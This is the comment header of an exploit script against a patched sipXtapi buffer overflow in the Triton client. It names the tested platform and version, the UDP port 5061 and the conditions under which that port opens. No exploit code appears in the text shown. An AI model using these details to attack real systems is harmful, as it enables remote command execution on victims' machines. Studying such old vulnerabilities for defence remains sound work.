# Tested on Windows XP SP2 with triton 1.0.4
# c0rrupt -{at}- f34r -{dot}- us
#
# This exploits the sipxtapi vuln in triton which was patched.. sometime ago..
# The exploit sends a specially crafted udp packet to the triton client
# which leads to command execution through a buffer overflow.
#
# The Triton client does not open the sipxtapi port 5061 by default.
# The port is open when the client attemps to try any talk session, and stays
# open for the remainder of the time it is running.
